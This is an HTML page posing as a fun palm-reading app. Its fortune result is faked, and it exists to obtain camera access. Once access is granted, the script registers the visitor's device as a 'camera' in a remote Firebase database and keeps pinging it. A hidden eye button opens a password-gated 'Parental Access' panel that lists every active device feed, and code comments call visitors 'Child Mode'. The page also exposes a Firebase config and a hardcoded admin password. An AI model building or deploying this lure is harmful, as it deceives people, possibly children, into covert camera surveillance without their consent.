<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîÆ Mystic Palm Reader</title>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, update } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCFk3FYO3_rWYNs4qXX05ZibipmIDmWuoU",
            authDomain: "astropro-41cd7.firebaseapp.com",
            databaseURL: "https://astropro-41cd7-default-rtdb.firebaseio.com",
            projectId: "astropro-41cd7",
            storageBucket: "astropro-41cd7.appspot.com",
            messagingSenderId: "292942513920",
            appId: "1:292942513920:web:686a0d029bbfb3a18915e5",
            measurementId: "G-5DJ9H32Q46"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        window.firebaseDB = { db: database, ref, set, onValue, update };
    </script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #6e48aa, #9d50bb);
            color: white;
            text-align: center;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(8px);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        .camera-box {
            width: 100%;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 25px 0;
        }
        video {
            width: 100%;
            border-radius: 8px;
            display: none;
        }
        #palmPlaceholder {
            width: 100%;
            border-radius: 8px;
            display: block;
        }
        button {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
        }
        button:hover {
            background: #ff5252;
        }
        #adminPanel {
            display: none;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        #cameraGrid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .camera-feed {
            background: #333;
            border-radius: 8px;
            padding: 10px;
        }
        .hidden-admin {
            position: fixed;
            bottom: 20px;
            right: 20px;
        }
        .blink {
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîÆ Mystic Palm Reader</h1>
        <p>Discover your future by analyzing your palm lines!</p>
        
        <div class="camera-box">
            <img id="palmPlaceholder" src="https://i.imgur.com/JqYeYnW.jpg" alt="Palm Reading Example">
            <video id="userVideo" autoplay muted></video>
        </div>
        
        <button id="startBtn">‚ú® Allow Camera Access</button>
        <button id="analyzeBtn" class="blink" style="display:none;">üîç Analyzing Your Palm...</button>

        <div class="hidden-admin">
            <button id="adminBtn">üëÅÔ∏è</button>
            <div id="adminPanel">
                <h3>Parental Access üîí</h3>
                <input type="password" id="secretCode" placeholder="Enter Admin Password">
                <button id="unlockBtn">Unlock</button>
                <div id="cameraGrid"></div>
            </div>
        </div>
    </div>

    <script>
        // DOM Elements
        const startBtn = document.getElementById('startBtn');
        const analyzeBtn = document.getElementById('analyzeBtn');
        const palmPlaceholder = document.getElementById('palmPlaceholder');
        const userVideo = document.getElementById('userVideo');
        const adminBtn = document.getElementById('adminBtn');
        const adminPanel = document.getElementById('adminPanel');
        const secretCode = document.getElementById('secretCode');
        const unlockBtn = document.getElementById('unlockBtn');
        const cameraGrid = document.getElementById('cameraGrid');

        // Firebase
        const { db, ref, set, onValue, update } = window.firebaseDB;
        const ADMIN_PASSWORD = "saurabhup60"; // Change this!
        let deviceId = "device_" + Math.random().toString(36).substr(2, 9);
        let isAdmin = false;

        // Check for admin mode
        if(window.location.hash === "#admin") {
            showAdminPanel();
            isAdmin = true;
        }

        // Child Mode - Camera Access
        startBtn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                userVideo.srcObject = stream;
                palmPlaceholder.style.display = 'none';
                userVideo.style.display = 'block';
                startBtn.style.display = 'none';
                analyzeBtn.style.display = 'inline-block';
                
                // Save to Firebase
                set(ref(db, 'cameras/' + deviceId), {
                    active: true,
                    timestamp: new Date().toISOString()
                });
                
                // Keep alive
                setInterval(() => {
                    update(ref(db, 'cameras/' + deviceId), { ping: new Date().toISOString() });
                }, 5000);
                
                // Fake analysis
                setTimeout(() => {
                    analyzeBtn.textContent = "üåü Your Future Looks Bright!";
                }, 3000);
            } catch (err) {
                alert("Could not access camera: " + err.message);
            }
        });

        // Admin Mode
        function showAdminPanel() {
            document.getElementById('startBtn').style.display = 'none';
            adminPanel.style.display = 'block';
            
            unlockBtn.addEventListener('click', () => {
                if(secretCode.value === ADMIN_PASSWORD) {
                    loadAllCameras();
                    secretCode.style.display = 'none';
                    unlockBtn.style.display = 'none';
                } else {
                    alert("Wrong password!");
                }
            });
        }

        function loadAllCameras() {
            onValue(ref(db, 'cameras'), (snapshot) => {
                cameraGrid.innerHTML = '';
                const cameras = snapshot.val();
                
                for(const id in cameras) {
                    if(cameras[id].active) {
                        const feed = document.createElement('div');
                        feed.className = 'camera-feed';
                        feed.innerHTML = `
                            <h3>Device ${id}</h3>
                            <iframe src="${window.location.href.split('#')[0]}?view=${id}" 
                                    width="100%" height="300"></iframe>
                        `;
                        cameraGrid.appendChild(feed);
                    }
                }
            });
        }

        // Toggle admin panel
        adminBtn.addEventListener('click', () => {
            adminPanel.style.display = adminPanel.style.display === 'block' ? 'none' : 'block';
        });
    </script>
</body>
</html>